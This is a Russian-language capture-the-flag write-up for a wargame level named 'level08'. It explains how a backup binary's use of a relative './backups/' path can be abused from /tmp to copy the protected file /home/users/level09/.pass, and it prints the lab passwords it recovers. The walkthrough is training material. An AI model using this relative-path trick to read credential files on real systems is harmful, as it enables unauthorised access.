## HowTo

```
> su level08
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

### Инструменты:
- Ida Pro + hex rays

**NB:** Для работы с файлом стягиваем его на локальную машину

### Анализ и ход решения

Задача сводится к пониманию проблемы использования не абсолютных путей

 - программа ожидает на вход путь к файлу
 - на старте помимо проверки аргумента, происходит попытка открыть файл `./backups/.log` в `'w'`. Ошибка приводит к выходу
 - затем открывается файл из аргумента, содержимое читается в буфер, после чего записывается в бэкап `./backups/_target_file_name`

Решение кажется тривиальным - воспользуемся директорией `/tmp` для создания нужной нам структуры директорий.
Наша цель - сделать бэкап файла `/home/users/level09/.pass` в `/tmp/backups/home/users/level09/.pass`

1. Проведем эксперимент

```bash
> cd /tmp
> echo "Hello World!" -> test.txt
> mkdir backups
> /home/users/level08/level08 ./test.txt
> cat ./backups/test.txt
Hello World!
```
2. Если на шаге запуска мы передадим абсолютный путь - `/tmp/test.txt`, получим примерно такую ошибку:
> ERROR: Failed to open ./backups//tmp/test.txt

Несложно догадаться, что для решения проблемы нам нужно вточности повторить в нашей директории `/tmp/backups/` структуру директрий вызываемого файла

3. Делаем бэкап файла с паролем
```bash
> cd /tmp
> mkdir backups
> mkdir backups/home
> mkdir backups/home/users
> mkdir backups/home/users/level09
> /home/users/level08/level08 /home/users/level09/.pass
> cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
